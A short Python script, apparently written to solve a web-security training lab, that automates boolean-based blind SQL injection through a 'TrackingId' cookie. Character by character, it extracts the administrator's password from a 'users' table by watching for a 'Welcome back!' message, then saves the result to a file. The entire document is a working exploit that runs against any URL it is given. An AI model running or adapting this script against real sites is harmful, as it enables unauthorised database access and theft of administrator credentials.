import requests
import argparse
import string

parser = argparse.ArgumentParser(description="lee")
parser.add_argument('-u', '--url', type=str, required=True, help='Url to target')
parser.add_argument('--cookie1', type=str, required=True, help='TrackingId')
parser.add_argument('--cookie2', type=str, required=True, help='Session Cookie')

args = parser.parse_args()

url = args.url
cookie1 = args.cookie1
cookie2 = args.cookie2

a_to_z = list(string.ascii_lowercase)+list(string.digits)+list(string.punctuation)
print(a_to_z)

payload = f"' and (select substring(password,1,1) from users where username='administrator')='a'--"
print(cookie1 + str(payload))

def check(url, cookie1, cookie2, placeholder, alpha):
	url = url
	cookie1 = cookie1
	cookie2 = cookie2

	payload = f"' and (select substring(password,{placeholder},1) from users where username='administrator')='{alpha}'--"

	cookies = {
		"TrackingId" : cookie1 + payload,
		"session" : cookie2
	}

	response = requests.get(url, cookies=cookies)

	check_line = "<div>Welcome back!</div><p>|</p>"
	if response.status_code == 200:
		count = 0 
		for line in response.text.splitlines():
			if line.strip() == check_line:
				return True
			elif (len(response.text.splitlines()) <= count):
				return False
			else:
				count +=1
	else:
		return response.status_code



password = ""

for placeholder in range(20):

	for i in a_to_z:
		if check(url, cookie1, cookie2, placeholder+1,i) == True:
			print(f"{placeholder+1} place of password is {i}")
			password += i
			break 
		else:
			print(f"{placeholder+1} place of password is not {i}")

with open('password.txt', 'a') as lee:
	lee.writelines(password)
